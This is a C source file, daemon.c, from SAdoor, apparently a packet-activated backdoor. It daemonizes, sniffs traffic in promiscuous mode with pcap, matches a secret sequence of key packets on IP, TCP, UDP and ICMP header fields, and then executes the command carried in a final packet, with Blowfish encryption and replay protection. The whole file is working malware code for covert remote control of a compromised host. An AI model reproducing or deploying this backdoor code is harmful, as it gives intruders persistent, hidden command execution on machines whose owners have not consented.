/*
 *  File: daemon.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor "daemon-loop" routines.
 *  Version: 1.0
 *  Date:
 *
 *  Copyright (c) 2002 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "sadoor.h"
#include "command.h"

/* Global variables */
extern struct sa_pkts *packets;
extern struct sa_options opt;
extern struct capture *cap;

/* Local variables */
static struct sa_pkt *kpkt = NULL; /* Current packet */
static pid_t daemon_pid = 0;
static struct bfish_key *bk;

/* Local functions */
static void packet_analyze(u_char *,const struct pcap_pkthdr *, const u_char *);

/*
 * atexit(3) function
 */
void
cleanup(void)
{
	log_sys("Cleaning up before exit\n");
	log_priv("Exiting\n");
	
	if ((getpid() == daemon_pid) && (opt.sao_usepidf == 1)) {

		if (unlink(opt.sao_pidfile) < 0)
			log_sys("unlink(%s): %s\n", opt.sao_pidfile, strerror(errno));
	}
}

/*
 * Signal handler
 */
void
sighandler(int signo)
{
	if (signo == SIGALRM) {
		
		if (opt.sao_privbose > 2)
			log_priv("Key packets timed out after %u seconds\n", 
					opt.sao_ptimeout);
		kpkt = NULL;
		signal(SIGALRM, sighandler);
		return;
	}
	
	else if (signo == SIGTERM) 
		log_sys("Terminated by signal %d (SIGTERM)", signo);
	
	else if (signo == SIGSEGV) 
		log_sys("Segmention Fault");

	else if (signo == SIGBUS) 
		log_sys("Bus Error");
	
	/* cleanup()  and exit */
	exit(EXIT_FAILURE);
}

/*
 * Become daemon and listen for incoming packets.
 */
int 
go_daemon(void)
{
    /* Open device */
    if ( (cap = cap_open(opt.sao_iface, opt.sao_promisc)) == NULL)
        exit(EXIT_FAILURE);

    /* Fork first time to (among other things) guarantee that
     * we are not a process group leader */
    switch(fork()) {
        case -1:
            perror("fork");
            exit(-1);
            break;

        case 0: /* What we want */
            break;

        default: /* Exit parent */
            exit(0);
            break;
    }

    /* Become a process group and session group leader */
    if (setsid() < 0) {
        perror("setsid");
        exit(-1);
    }

    /* Fork again so the parent (session leader) can exit
     * (we dont want a controlling terminal) */
    switch(fork()) {
        case -1:
            perror("fork");
            exit(-1);
            break;

        case 0: /* Nice */
            break;

        default: /* Exit session leader */
            exit(0);
            break;
    }

    /* Do not block any directories */
    chdir("/");

	/* Set umask */
	umask(SADOOR_UMASK);

	/* Log PID */
	if (opt.sao_usepidf == 1) {
		u_char buf[12];
		int fd;
		
		memset(buf, 0x00, sizeof(buf));

		if ( (fd = open(opt.sao_pidfile, O_WRONLY | O_CREAT | O_EXCL, 0600)) < 0) {
			fprintf(stderr, "** Error: open(%s): %s\n", opt.sao_pidfile, strerror(errno));
			exit(EXIT_FAILURE);
		}

		snprintf(buf, sizeof(buf) -1, "%d\n", getpid());
		write(fd, buf, strlen(buf));	
		close(fd);
		chmod(opt.sao_pidfile, (mode_t)0400);
	
		/* Save pid of daemon to avoid removal of pidfile from
		 * any child process */
		 daemon_pid = getpid();
	}

    atexit(cleanup);
    signal(SIGTERM, sighandler);
    signal(SIGSEGV, sighandler);
    signal(SIGBUS, sighandler);
    signal(SIGALRM, sighandler);
	signal(SIGHUP, SIG_IGN);  /* Ignore for now */

	/* Open syslog */
	if (opt.sao_sysvbose > 0)
		openlog(opt.sao_pname, LOG_PID | LOG_CONS, opt.sao_logfac);

	/* Open private logfile */
	if (opt.sao_privbose > 0)
		if (openprivlog(opt.sao_privlog, opt.sao_pname) < 0) 
			exit(EXIT_FAILURE);

	/* TODO! Build filter? */

	log_sys("Listening%son %s", 
		opt.sao_promisc == 0 ? " " : " in promiscuos mode ", opt.sao_iface);
	log_priv("Listening%son %s\n",
		opt.sao_promisc == 0 ? " " : " in promiscuos mode ", opt.sao_iface);

#ifndef SADOOR_DISABLE_ENCRYPTION
	/* Init blowfish key */
	if ( (bk = bfish_keyinit(opt.sao_bfkey, sizeof(opt.sao_bfkey))) == NULL) {
		log_priv("Error: Could not initiate blowfish key\n");
		log_sys("Error: Could not initiate blowfish key");
		exit(EXIT_FAILURE);
	}
#endif /* SADOOR_DISABLE_ENCRYPTION */
	memset(opt.sao_bfkey, 0x00, sizeof(opt.sao_bfkey));

	/* Init timestamp list for replay protection */
	if (opt.sao_protrep == 1) {
		struct timeval tv;
		
		if (gettimeofday(&tv, NULL) == -1) {
			log_sys("Error: gettimeofday(): calloc(): %s\n", strerror(errno));
			log_priv("Error: gettimeofday(): %s", strerror(errno));
		}

		if (replay_add(tv.tv_sec, tv.tv_usec) != 0) 
			exit(EXIT_FAILURE);
	}

	/* Capture packets until an error occur and send them to
	 * packet_analyze() */
	kpkt = NULL;
	pcap_loop(cap->cap_pcapd, -1, packet_analyze, NULL);

	
    /* Hopefully unreached */
    log_sys("Error: pcap_loop(): %s\n", strerror(errno));
	log_priv("Error: pcap_loop(): %s\n", strerror(errno));
	return(-1);
}

/*
 * Examine all the filtered out packets and mark them of as we go.
 */
static void
packet_analyze(u_char *user,    /* Unused user defined argument */
	const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
	IPv4_hdr *iph;
	u_short paylen = 0;		  /* Size of payload in bytes */
	u_short dlen = 0;		  /* Length of expected data */
	u_char *data = NULL;	  /* Expected data */
	u_char *payload = NULL;	  /* Packet payload */
	u_char *command = NULL;	  /* Payload command */
	u_short cmd_len = 0;	  /* Command length */
	static size_t pktcount;

	/* Set first packet */
	if (kpkt == NULL) {
		kpkt = packets->key_pkts;
		pktcount = 1;
	}

	/* Check that packet length is OK */
	if ( (pkthdr->len) <= (cap->cap_offst + sizeof(IPv4_hdr))) {
		log_priv("Dropped small packet");
		return;
	}

	/* Create IP header */
	iph = (IPv4_hdr *)(packet + cap->cap_offst);

	/* Only IPv4 is supported for now .. */
	if (iph->ip_ver != 4) 
		return;

    /* Source address */
    if (FIELD_IS_SET(kpkt->sa_iph_fields, IPH_SADDR)) {
        if (kpkt->sa_iph_saddr != iph->ip_sadd) 
            return;
    }

	/* Destination address */
	if (FIELD_IS_SET(kpkt->sa_iph_fields, IPH_DADDR)) {
		if (kpkt->sa_iph_daddr != iph->ip_dadd) 
			return;	
	}

	/* Type of service */
	if (FIELD_IS_SET(kpkt->sa_iph_fields, IPH_TOS)) {
		if (kpkt->sa_iph_tos != iph->ip_tos) 
			return;
	}

	/* ID */
	if (FIELD_IS_SET(kpkt->sa_iph_fields, IPH_ID)) {
		if (kpkt->sa_iph_id != iph->ip_id) 
			return;
	}

	/* Time To Live */
	if (FIELD_IS_SET(kpkt->sa_iph_fields, IPH_TTL)) {
		if (kpkt->sa_iph_ttl != iph->ip_ttl) 
			return;
	}

	/* Protocol */
	if (kpkt->sa_pkt_proto != iph->ip_prot) 
		return;

	/* Protocol contents */
	if (kpkt->sa_pkt_ph != NULL) {
		
		/* Examine TCP */
		if (kpkt->sa_pkt_proto == PROTO_TCP) {
			struct sa_tcph *ptcp; 
			TCP_hdr *tcph;
			
			ptcp = (struct sa_tcph *)kpkt->sa_pkt_ph;
			tcph = (TCP_hdr *)(packet + cap->cap_offst + (iph->ip_hlen)*4);
			paylen = ntohs(iph->ip_tlen) - (4*iph->ip_hlen + 4*tcph->tcp_hlen);
            payload = (u_char *)((u_char *)tcph + 4*(tcph->tcp_hlen));
            dlen = ptcp->sa_tcph_dlen;
			data = ptcp->sa_tcph_data;

			/* Destination port */
			if (FIELD_IS_SET(ptcp->sa_tcph_fields, TCPH_DPORT)) {
				if (ptcp->sa_tcph_dport != tcph->tcp_dprt) 
					return;
			}

			/* Source port */
			if (FIELD_IS_SET(ptcp->sa_tcph_fields, TCPH_SPORT)) {
				if (ptcp->sa_tcph_sport != tcph->tcp_sprt) 
					return;
			}

			/* Sequence number */
			if (FIELD_IS_SET(ptcp->sa_tcph_fields, TCPH_SEQ)) {
				if (ptcp->sa_tcph_seq != tcph->tcp_seq) 
					return;
			}

			/* Acknowledge number */
			if (FIELD_IS_SET(ptcp->sa_tcph_fields, TCPH_ACK)) {
				if (ptcp->sa_tcph_ack != tcph->tcp_ack) 
					return;
			}

			/* Flags */
			if (FIELD_IS_SET(ptcp->sa_tcph_fields, TCPH_FLAGS)) {
				if (ptcp->sa_tcph_flags != tcph->tcp_flgs) 
					return;
			}
		}
		
		/* Examine UDP */
		else if (kpkt->sa_pkt_proto == PROTO_UDP) {
			UDP_hdr *udph;
			struct sa_udph *pudp; 
	
			pudp = (struct sa_udph *)kpkt->sa_pkt_ph;
			udph = (UDP_hdr *)(packet + cap->cap_offst + (iph->ip_hlen)*4);
			paylen = ntohs(iph->ip_tlen) - (4*iph->ip_hlen) - sizeof(UDP_hdr);
			payload = (u_char *)((u_char *)udph + sizeof(UDP_hdr));
			dlen = pudp->sa_udph_dlen;
			data = pudp->sa_udph_data;
			
			/* Destination port */
			if (FIELD_IS_SET(pudp->sa_udph_fields, UDPH_DPORT)) {
				if (pudp->sa_udph_dport != udph->udp_dprt) 
					return;
			}

			/* Source port */
			if (FIELD_IS_SET(pudp->sa_udph_fields, UDPH_SPORT)) {
				if (pudp->sa_udph_sport != udph->udp_sprt) 
					return;
			}
		}
		
		/* Examine ICMP */
		else if (kpkt->sa_pkt_proto == PROTO_ICMP) {
			ICMP_hdr *icmph;
			struct sa_icmph *picmp;

			picmp = (struct sa_icmph *)kpkt->sa_pkt_ph;
			icmph = (ICMP_hdr *)(packet + cap->cap_offst + (iph->ip_hlen)*4);
			paylen = ntohs(iph->ip_tlen) - (4*iph->ip_hlen) - sizeof(ICMP_hdr);
			payload = (u_char *)((u_char *)icmph + sizeof(ICMP_hdr));
			dlen = picmp->sa_icmph_dlen;
			data = picmp->sa_icmph_data;
	
	
			/* Type */
			if (FIELD_IS_SET(picmp->sa_icmph_fields, ICMPH_TYPE)) {
				if (picmp->sa_icmph_type != icmph->icmp_type)
					return;
			}
					
			/* Code */
			if (FIELD_IS_SET(picmp->sa_icmph_fields, ICMPH_CODE)) {
				if (picmp->sa_icmph_code != icmph->icmp_code)
					return;
			}
			
			/* Seq */
			if (FIELD_IS_SET(picmp->sa_icmph_fields, ICMPH_SEQ)) {
				if (picmp->sa_icmph_seq != icmph->icmp_u32.icmp_echo.seq)
					return;
			}

			/* ID */
			if (FIELD_IS_SET(picmp->sa_icmph_fields, ICMPH_ID)) {
				if (picmp->sa_icmph_id != icmph->icmp_u32.icmp_echo.id)
					return;
			}
		}	
	}

	/* Data */
	if (dlen != 0) {

		/* Payload to short */
		if (dlen > paylen) {
			return;
		}
		
		/* Beginning of payload and data mismatch */
		if (memcmp(payload, data, dlen) != 0) {
			return;
		}
	}


	/* This was the command packet */
	if (kpkt == packets->cmd_pkt) {
		
		/* Disable alarm */
		alarm(0);
		
		/* Set (the rest of) payload as command */
		if ( (cmd_len = paylen - dlen) > 0) 
			command = (u_char *)(payload + dlen);
	
			if (opt.sao_privbose > 2)
				log_priv("Received valid command packet "
					"(command length: %u bytes)\n", cmd_len);

		handle_command(command, cmd_len, bk);
		kpkt = NULL;
		return;
	}

	if ((pktcount > 1 ) && (opt.sao_privbose > 2))
		log_priv("Received key packet %u\n", pktcount);

	if ( (kpkt = kpkt->sa_kpkt_next) == NULL) {
		kpkt = packets->cmd_pkt;	
	}

	/* Set timeout when first packet is received */
	if (pktcount == 1) {
		alarm(opt.sao_ptimeout);

		if (opt.sao_privbose > 2) {

			if (opt.sao_ptimeout)
				log_priv("Received key packet 1 (timeout set to %u seconds)\n", 
					opt.sao_ptimeout);
			else
				log_priv("Received key packet 1 (no timeout)\n");
		}
	}

	pktcount++;
	return;
}
